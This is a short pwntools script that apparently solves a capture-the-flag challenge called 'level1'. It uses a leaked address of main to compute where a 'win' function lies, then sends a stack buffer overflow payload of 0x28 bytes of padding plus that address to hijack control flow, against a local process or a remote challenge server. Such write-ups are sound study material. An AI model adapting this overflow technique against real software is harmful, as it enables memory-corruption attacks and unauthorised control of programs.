from pwn import *
context.terminal = "tmux splitw -h".split()

if args.REMOTE: 
    p =remote("kayle.snu.ac.kr",10035)
else: 
    p = process("./level1")
    gdb.attach(p)
p.recvuntil(b"Hint: <<< ")

leak = p.recvuntil(b">>>")
addr_of_main = int(leak.split(b" ")[0],16)
success(f"addr_of_main:{hex(addr_of_main)}")

e = ELF("./level1")
addr_of_win = addr_of_main - e.symbols['main'] + e.symbols['win']
success(f"addr_of_win:{hex(addr_of_win)}")

p.sendline(b"A"*0x28 + p64(addr_of_win+1))
p.interactive() 